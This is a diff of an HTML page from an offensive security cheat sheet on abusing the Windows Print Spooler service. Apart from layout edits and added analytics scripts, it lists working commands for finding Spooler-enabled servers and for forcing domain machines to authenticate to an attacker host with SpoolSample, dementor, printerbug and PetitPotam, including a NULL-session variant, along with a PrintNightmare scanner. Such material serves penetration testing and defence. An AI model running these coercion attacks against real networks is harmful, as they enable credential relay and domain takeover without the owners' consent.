@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:53 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>Spooler Service :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1833,25 +1862,21 @@
     
     
     
-    
-
-<h3 id="wip">WIP</h3>
-
+    <h3 id="wip">WIP</h3>
 <h3 id="finding-spooler-services">Finding Spooler Services</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse</span>
 
 <span style="color:#75715e"># Finding Windows Servers on the domain</span>
 Get-ADComputer -Filter <span style="color:#f92672">{(</span>OperatingSystem -like <span style="color:#d88200">&#34;*windows*server*&#34;</span><span style="color:#f92672">)</span> -and <span style="color:#f92672">(</span>OperatingSystem -notlike <span style="color:#d88200">&#34;2016&#34;</span><span style="color:#f92672">)</span> -and <span style="color:#f92672">(</span>Enabled -eq <span style="color:#d88200">&#34;True&#34;</span><span style="color:#f92672">)}</span> -Properties * <span style="color:#111">|</span> <span style="color:#00a8c8">select</span> Name <span style="color:#111">|</span> ft -HideTableHeaders &gt; servers.txt
 
-<span style="color:#75715e"># Finding Spooler services listening</span> 
+<span style="color:#75715e"># Finding Spooler services listening </span>
 <span style="color:#75715e"># https://github.com/NotMedic/NetNTLMtoSilverTicket</span>
 .<span style="color:#8045ff">\G</span>et-SpoolStatus.ps1
 ForEach <span style="color:#f92672">(</span><span style="color:#111">$server</span> in Get-Content servers.txt<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>Get-SpoolStatus <span style="color:#111">$server</span><span style="color:#f92672">}</span>
 
 <span style="color:#75715e"># Or on Linux</span>
-rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM <span style="color:#111">|</span> grep MS-RPRN</code></pre></div>
-<p><br/></p>
-
+rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM <span style="color:#111">|</span> grep MS-RPRN
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="ms-rprn-abuse-printer-bug">MS-RPRN Abuse (Printer Bug)</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-rprn
 
@@ -1861,9 +1886,8 @@ SpoolSample.exe &lt;TARGET&gt; &lt;RESPONDERIP&gt;
 
 <span style="color:#75715e"># Using printerbug or dementor</span>
 python dementor.py -d domain -u username -p password &lt;RESPONDERIP&gt; &lt;TARGET&gt;
-printerbug.py <span style="color:#d88200">&#39;domain/username:password&#39;</span>@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</code></pre></div>
-<p><br/></p>
-
+printerbug.py <span style="color:#d88200">&#39;domain/username:password&#39;</span>@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="ms-sfsrpc">MS-SFSRPC</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Really great doc</span>
 https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-efsr
@@ -1881,9 +1905,8 @@ $ ./petitpotam.py -d domain.com -u myuser -p mypass &lt;attacker_ip&gt; &lt;targ
 
 <span style="color:#75715e"># Seems possible to use NULL sessions on some domain controllers</span>
 <span style="color:#75715e"># TEST</span>
-$ ./petitpotam.py -d <span style="color:#d88200">&#39;&#39;</span> -u <span style="color:#d88200">&#39;&#39;</span> -p <span style="color:#d88200">&#39;&#39;</span> &lt;attacker_ip&gt; &lt;target&gt;</code></pre></div>
-<p><br/></p>
-
+$ ./petitpotam.py -d <span style="color:#d88200">&#39;&#39;</span> -u <span style="color:#d88200">&#39;&#39;</span> -p <span style="color:#d88200">&#39;&#39;</span> &lt;attacker_ip&gt; &lt;target&gt;
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="printnightmare-cve-2021-34527">PrintNightmare (CVE-2021-34527)</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python Scanner</span>
 https://github.com/byt3bl33d3r/ItWasAllADream
@@ -1903,11 +1926,12 @@ optional arguments:
                         password to authenticate as. If not specified will prompt. <span style="color:#f92672">(</span>default: None<span style="color:#f92672">)</span>
   -d DOMAIN, --domain DOMAIN
                         domain to authenticate as <span style="color:#f92672">(</span>default: None<span style="color:#f92672">)</span>
-  --timeout TIMEOUT     Connection timeout in secods <span style="color:#f92672">(</span>default: <span style="color:#ae81ff">30</span><span style="color:#f92672">)</span>
-  --threads THREADS     Max concurrent threads <span style="color:#f92672">(</span>default: <span style="color:#ae81ff">100</span><span style="color:#f92672">)</span>
+  --timeout TIMEOUT     Connection timeout in secods <span style="color:#f92672">(</span>default: 30<span style="color:#f92672">)</span>
+  --threads THREADS     Max concurrent threads <span style="color:#f92672">(</span>default: 100<span style="color:#f92672">)</span>
   -v, --verbose         Enable verbose output <span style="color:#f92672">(</span>default: False<span style="color:#f92672">)</span>
   --csv-column CSV_COLUMN
-                        If target argument is a CSV file, this argument specifies which column to parse <span style="color:#f92672">(</span>default: DNSHostName<span style="color:#f92672">)</span></code></pre></div>
+                        If target argument is a CSV file, this argument specifies which column to parse <span style="color:#f92672">(</span>default: DNSHostName<span style="color:#f92672">)</span>
+</code></pre></div>
 
     
     
